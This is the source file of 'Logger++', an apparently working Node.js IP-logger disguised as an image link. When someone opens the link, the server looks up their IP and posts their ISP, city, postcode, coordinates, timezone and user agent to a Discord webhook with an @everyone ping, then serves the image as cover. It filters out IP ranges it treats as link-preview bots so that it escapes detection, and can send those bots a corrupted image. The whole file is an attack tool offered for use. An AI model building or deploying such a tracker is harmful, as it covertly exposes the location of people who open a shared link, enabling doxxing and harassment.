//       __                                            //
//      / /  ___   __ _  __ _  ___ _ __  _     _       //
//     / /  / _ \ / _` |/ _` |/ _ \ '__|| |_ _| |_     //
//    / /__| (_) | (_| | (_| |  __/ | |_   _|_   _|    //
//    \____/\___/ \__, |\__, |\___|_|   |_|   |_|      //
//                |___/ |___/                          //
//                                                     //
//       A Powerful Node.JS Discord Logger Tool.       //
//        Made By: https://github.com/Hypverr          //
//         THIS REQUIRES NODEJS AND EXPRESS            // 
//         ⚠ OPTIONS ARE IN CONFIG.JSON! ⚠            //
//                                                     //
// ^ ocd 😭

// ⚠ DONT EDIT PAST THIS POINT IF YOU DONT KNOW WHAT YOU ARE DOING!! ⚠
const app = require("express")();
const https = require("https");
const config = require("./config.json");



function request(options, data, callback) {
    const req = https.request(options, function(res) {
        let responseData = "";
        res.on("data", (chunk) => {
            responseData += chunk;
        });
        res.on("end", () => {
            try {
                callback(responseData)
            } catch (e) {
                console.log(e)
            }
        });
    });

    if (data) req.write(JSON.stringify(data));
    req.end();
}


const disallowedIPs = /^(35\.|34\.|104\.|143\.|27\.|164\.)/;

function checkifbot(ip) {
    return (ip && ip.match(disallowedIPs) && true) || false
}


const glitchedimgdata =
    "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x01\xe0\x01\xe0\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

app.get("/*", (req, res) => {
    for (const key in config) {
        if (config.hasOwnProperty(key)) {
            if (config[key] === null) {
                console.log(`${key} has a null value.`)
                return;
            }
        }
    }
    let ip = req.headers["x-forwarded-for"];
    if (checkifbot(ip) == true) {
        if (config.corruptedimage == true) {
            res.setHeader("Content-Type", "image/png");
            res.send(Buffer.from(glitchedimgdata, "binary"));
        }
        return;
    }
    request({
            hostname: "ipwho.is",
            path: `/${ip}`,
            method: "GET"
        },
        null,
        (response) => {
            response = JSON.parse(response);
            let data = {
                content: "@everyone",
                embeds: [{
                    description: `
**🌐 IP:** \`${ip ? ip : "N/A"}\`
**🧠 Internet Provider:** \`${
              response["connection"]["isp"] ? response["connection"]["isp"] : "N/A"
            }\`
**🏁 Country:** \`${response["country"] ? response["country"] : "N/A"}/${
              response["country_code"] ? response["country_code"] : "N/A"
            }\`
**🏴 Region:** \`${response["region"] ? response["region"] : "N/A"}/${
              req.headers["x-vercel-ip-country-region"]
                ? req.headers["x-vercel-ip-country-region"]
                : response["region_code"]
                ? response["region_code"]
                : "N/A"
            }\`
**🏙 City:** \`${
              response["city"]
                ? response["city"]
                : req.headers["x-vercel-ip-city"]
                ? req.headers["x-vercel-ip-city"]
                : "N/A"
            }\`
**🤐 ZipCode:** \`${response["postal"] ? response["postal"] : "N/A"}\`
**📌 Coordinates:** \`${
              req.headers["x-vercel-ip-latitude"]
                ? req.headers["x-vercel-ip-latitude"]
                : response["latitude"]
                ? response["latitude"]
                : "N/A"
            }, ${
              req.headers["x-vercel-ip-longitude"]
                ? req.headers["x-vercel-ip-longitude"]
                : response["longitude"]
                ? response["longitude"]
                : "N/A"
            }\`
**⌛ Timezone:** \`${
              req.headers["x-vercel-ip-timezone"]
                ? req.headers["x-vercel-ip-timezone"]
                : response["timezone"]["id"]
                ? response["timezone"]["id"]
                : "N/A"
            }/${
              response["timezone"]["abbr"] ? response["timezone"]["abbr"] : "N/A"
            }\` 
**💻 User Agent:** \`${
              req.headers["user-agent"] ? req.headers["user-agent"] : "N/A"
            }\``,

                    footer: {
                        text: " @Hypverr | Logger++ ",
                        icon_url: "https://avatars.githubusercontent.com/u/116686230?v=4",
                    },
                }, ],
            };

            request({
                    hostname: "discord.com",
                    path: config.webhookurl.replace("https://discord.com", ""),
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Content-Length": Buffer.byteLength(JSON.stringify(data)),
                    },
                },
                data,
                () => {
                    if (config.imageurl) {
                        https.get(config.imageurl, (response) => {
                            if (response.statusCode === 200) {
                                res.setHeader("Content-Type", "image/png");
                                response.pipe(res);
                            } else
                                res
                                .status(500)
                                .send(config.imageurl + " Could not be downloaded");
                        });
                    }
                }
            );
        }
    );
});
app.listen(config.port);
